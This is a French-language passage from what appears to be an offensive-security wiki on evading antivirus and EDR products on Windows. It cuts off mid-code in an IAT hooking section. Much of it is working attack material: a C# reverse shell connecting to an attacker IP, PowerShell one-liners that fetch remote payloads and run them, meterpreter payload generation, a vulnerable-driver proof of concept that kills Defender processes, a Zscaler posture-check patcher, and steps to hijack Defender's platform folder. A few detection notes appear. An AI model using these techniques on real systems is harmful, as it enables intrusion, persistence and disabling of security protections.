> Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** **ne déclencheront pas SmartScreen**.

Une méthode très efficace pour empêcher vos payloads d'obtenir le Mark of The Web est de les emballer dans une sorte de conteneur comme une ISO. Cela s'explique par le fait que Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui empaquette des payloads dans des conteneurs de sortie pour échapper à Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un puissant mécanisme de journalisation dans Windows qui permet aux applications et composants système de **consigner des événements**. Cependant, il peut aussi être utilisé par les produits de sécurité pour surveiller et détecter des activités malveillantes.

De la même manière qu'AMSI peut être désactivé (contourné), il est aussi possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans consigner d'événements. Cela se fait en patchant la fonction en mémoire pour qu'elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous pouvez trouver plus d'informations dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Le chargement de binaires C# en mémoire est connu depuis longtemps et reste une excellente façon d'exécuter vos outils de post-exploitation sans être détecté par l'AV.

Puisque le payload sera chargé directement en mémoire sans toucher le disque, nous n'aurons qu'à nous préoccuper de patcher AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) fournissent déjà la capacité d'exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de le faire :

- **Fork\&Run**

Cela implique de **lancer un nouveau processus sacrificiel**, d'injecter votre code malveillant de post-exploitation dans ce nouveau processus, d'exécuter ce code malveillant et, une fois terminé, de tuer le nouveau processus. Cela comporte à la fois des avantages et des inconvénients. L'avantage de la méthode fork-and-run est que l'exécution se déroule **en dehors** de notre processus implant Beacon. Cela signifie que si quelque chose dans notre action de post-exploitation tourne mal ou est détecté, il y a une **bien meilleure chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande probabilité** d'être détecté par des **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. De cette façon, vous pouvez éviter de créer un nouveau processus et qu'il soit scanné par l'AV, mais l'inconvénient est que si quelque chose tourne mal lors de l'exécution de votre payload, il y a une **bien plus grande probabilité** de **perdre votre beacon** car il peut planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si vous voulez en savoir plus sur le chargement d'assemblies C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez aussi charger des C# Assemblies **from PowerShell**, regardez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la vidéo de S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise l'accès **to the interpreter environment installed on the Attacker Controlled SMB share**.

En autorisant l'accès aux Interpreter Binaries et à l'environnement sur le SMB share, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le dépôt indique : Defender scanne toujours les scripts mais en utilisant Go, Java, PHP, etc. nous avons **plus de flexibilité pour bypasser les signatures statiques**. Des tests avec des reverse shell scripts aléatoires non-obfusqués dans ces langages se sont avérés concluants.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le access token ou un produit de sécurité comme un EDR ou AV**, leur permettant de réduire ses privilèges de sorte que le processus ne meure pas mais n'ait pas les permissions pour vérifier les activités malveillantes.

Pour empêcher cela, Windows pourrait **prevent external processes** d'obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur un PC victime puis de l'utiliser pour le prendre en main et maintenir la persistance :
1. Download from https://remotedesktop.google.com/, cliquez sur "Set up via SSH", puis cliquez sur le fichier MSI pour Windows pour télécharger le fichier MSI.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur Next. L'assistant vous demandera d'autoriser ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez la commande fournie avec quelques ajustements : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

L'évasion est un sujet très compliqué ; parfois il faut prendre en compte de nombreuses sources de télémétrie dans un seul système, il est donc pratiquement impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement que vous rencontrez aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94) pour obtenir une introduction aux techniques d'Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ceci est aussi une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui va **retirer des parties du binaire** jusqu'à ce qu'il **détermine quelle partie Defender** considère comme malveillante et vous la fournisse.\
Un autre outil faisant la **même chose est** [**avred**](https://github.com/dobin/avred) avec un service web public disponible sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Jusqu'à Windows10, toutes les versions de Windows étaient fournies avec un **Telnet server** que vous pouviez installer (en tant qu'administrateur) en faisant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** au démarrage du système et **exécutez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (stealth) et désactiver le pare-feu:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l'option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Puis, déplacez le binaire _**winvnc.exe**_ et le fichier **nouvellement** créé _**UltraVNC.ini**_ à l'intérieur du **victim**

#### **Reverse connection**

Le **attacker** doit **exécuter sur** son **host** le binaire `vncviewer.exe -listen 5900` afin qu'il soit **préparé** à capter une reverse **VNC connection**. Ensuite, sur la **victim** : démarrez le daemon winvnc `winvnc.exe -run` et exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENTION :** Pour maintenir stealth vous ne devez pas faire certaines choses

- Ne lancez pas `winvnc` s'il est déjà en cours d'exécution sinon vous déclencherez un [popup](https://i.imgur.com/1SROTTl.png). Vérifiez s'il tourne avec `tasklist | findstr winvnc`
- Ne lancez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire, sinon cela ouvrira [la config window](https://i.imgur.com/rfMQWcf.png)
- Ne lancez pas `winvnc -h` pour l'aide sinon vous déclencherez un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant, **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **xml payload** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le Defender actuel terminera le processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier C# Revershell

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement automatique et exécution :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d'obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple : utiliser python pour créer des injecteurs :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Plus

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 a utilisé un petit utilitaire console connu sous le nom de **Antivirus Terminator** pour désactiver les protections endpoint avant de déployer le ransomware. L’outil fournit **son propre driver vulnérable mais *signé*** et l’abuse pour effectuer des opérations privilégiées en kernel qui ne peuvent pas être bloquées même par des services AV Protected-Process-Light (PPL).

Points clés
1. **Signed driver** : Le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le driver légitimement signé `AToolsKrnl64.sys` d’Antiy Labs’ “System In-Depth Analysis Toolkit”. Parce que le driver porte une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Service installation** :
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver comme un **service kernel** et la seconde le démarre afin que `\\.\ServiceMouse` devienne accessible depuis l’espace utilisateur.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works** : BYOVD contourne entièrement les protections en mode utilisateur ; du code s’exécutant en kernel peut ouvrir des processus *protégés*, les terminer, ou altérer des objets kernel indépendamment des protections PPL/PP, ELAM ou autres mécanismes de durcissement.

Détection / Atténuation
•  Activez la block list des drivers vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.  
•  Surveillez la création de nouveaux services *kernel* et alertez lorsqu’un driver est chargé depuis un répertoire accessible en écriture par tous ou qu’il n’est pas présent dans la allow-list.  
•  Surveillez les handles en mode utilisateur vers des objets device personnalisés suivis d’appels `DeviceIoControl` suspects.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applique des règles de posture de l’appareil localement et s’appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent un contournement complet possible :

1. L’évaluation de la posture se fait **entièrement côté client** (un booléen est envoyé au serveur).  
2. Les endpoints RPC internes vérifient uniquement que l’exécutable se connectant est **signé par Zscaler** (via `WinVerifyTrust`).

En **patchant quatre binaires signés sur le disque**, les deux mécanismes peuvent être neutralisés :

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Retourne toujours `1`, donc chaque vérification est conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ tout processus (même non signé) peut se lier aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacée par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Court-circuité |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers originaux et redémarré la stack de services :

* **Tous** les contrôles de posture affichent **vert/conforme**.
* Les binaires non signés ou modifiés peuvent ouvrir les named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas démontre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être contournées avec quelques modifications d'octets.

## Abuser Protected Process Light (PPL) pour manipuler AV/EDR avec LOLBINs

Protected Process Light (PPL) impose une hiérarchie signer/level de sorte que seuls des processus protégés de niveau égal ou supérieur peuvent s'altérer mutuellement. Offensivement, si vous pouvez lancer légitimement un binaire PPL-enabled et contrôler ses arguments, vous pouvez convertir une fonctionnalité bénigne (par ex., journalisation) en un primitive d'écriture contraint, soutenu par PPL, ciblant des répertoires protégés utilisés par AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui‑même et accepte un paramètre pour écrire un fichier journal vers un chemin spécifié par l'appelant.
- Lorsqu'il est lancé en tant que processus PPL, l'écriture de fichier se fait avec le support PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez des noms courts 8.3 pour pointer vers des emplacements normalement protégés.

8.3 short path helpers
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Obtenir le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` en utilisant un lanceur (p. ex., CreateProcessAsPPL).
2) Passer l'argument log-path de ClipUp pour forcer la création d'un fichier dans un répertoire AV protégé (p. ex., Defender Platform). Utiliser les noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l'AV pendant son exécution (p. ex., MsMpEng.exe), planifier l'écriture au démarrage avant le lancement de l'AV en installant un service de démarrage automatique qui s'exécute systématiquement plus tôt. Valider l'ordre de démarrage avec Process Monitor (boot logging).
4) Au redémarrage, l'écriture avec support PPL se produit avant que l'AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Remarques et contraintes
- Vous ne pouvez pas contrôler le contenu que ClipUp écrit au-delà de l'emplacement ; la primitive est adaptée à la corruption plutôt qu'à une injection de contenu précise.
- Nécessite des privilèges administrateur local/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; une exécution au démarrage évite les verrous de fichier.

Détections
- Création de processus de `ClipUp.exe` avec des arguments inhabituels, en particulier dont le parent est un lanceur non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Investiguer la création/modification de services avant les échecs de démarrage de Defender.
- Surveillance d'intégrité des fichiers sur les binaires/les répertoires Platform de Defender ; créations/modifications de fichiers inattendues par des processus avec des flags protected-process.
- Télémetrie ETW/EDR : surveiller les processus créés avec `CREATE_PROTECTED_PROCESS` et l'utilisation anormale du niveau PPL par des binaires non-AV.

Mesures d'atténuation
- WDAC/Code Integrity : restreindre quels binaires signés peuvent s'exécuter en tant que PPL et sous quels parents ; bloquer l'invocation de ClipUp en dehors de contextes légitimes.
- Hygiène des services : restreindre la création/modification de services à démarrage automatique et surveiller la manipulation de l'ordre de démarrage.
- Veiller à ce que la protection contre la manipulation de Defender et les protections de lancement précoce soient activées ; investiguer les erreurs de démarrage indiquant une corruption binaire.
- Envisager de désactiver la génération de noms courts 8.3 sur les volumes hébergeant des outils de sécurité si compatible avec votre environnement (tester soigneusement).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender choisit la plateforme depuis laquelle il s'exécute en énumérant les sous-dossiers sous:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier avec la chaîne de version la plus élevée lexicographiquement (par exemple, `4.18.25070.5-0`), puis démarre les processus de service Defender à partir de là (mettant à jour les chemins de service/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris les points de réanalyse de répertoire (symlinks). Un administrateur peut exploiter ceci pour rediriger Defender vers un chemin modifiable par un attaquant et obtenir un DLL sideloading ou perturber le service.

Préconditions
- Administrateur local (nécessaire pour créer des répertoires/symlinks sous le dossier Platform)
- Possibilité de redémarrer ou de déclencher la re-sélection de la plateforme Defender (redémarrage du service au démarrage)
- Seuls des outils intégrés sont nécessaires (mklink)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de plateforme fait confiance aux entrées de répertoire et choisit la version la plus élevée lexicographiquement sans valider que la cible résout vers un chemin protégé/de confiance.

Step-by-step (example)
1) Préparer un clone modifiable du dossier Platform actuel, par ex. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez un symlink de répertoire de version supérieure dans Platform pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé):
```cmd
shutdown /r /t 0
```
4) Vérifier que MsMpEng.exe (WinDefend) s'exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin du processus sous `C:\TMP\AV\` et la configuration du service/le registre reflétant cet emplacement.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs que Defender charge depuis son répertoire d'application pour exécuter du code dans les processus de Defender. Voir la section ci‑dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Supprimez le version-symlink afin qu'au prochain démarrage le chemin configuré ne soit pas résolu et que Defender n'arrive pas à démarrer :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Notez que cette technique n'accorde pas l'élévation de privilèges en elle‑même ; elle nécessite des privilèges administrateur.

## API/IAT Hooking + Call-Stack Spoofing avec PIC (Crystal Kit-style)

Les Red teams peuvent déplacer l'évasion à l'exécution hors de l'implant C2 et dans le module cible lui‑même en hookant sa Import Address Table (IAT) et en routant certaines APIs à travers du code position‑independent (PIC) contrôlé par l'attaquant. Cela généralise l'évasion au‑delà de la petite surface d'API exposée par de nombreux kits (p. ex., CreateProcessA), et étend les mêmes protections aux BOFs et aux DLLs post‑exploitation.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt Beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
  - For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
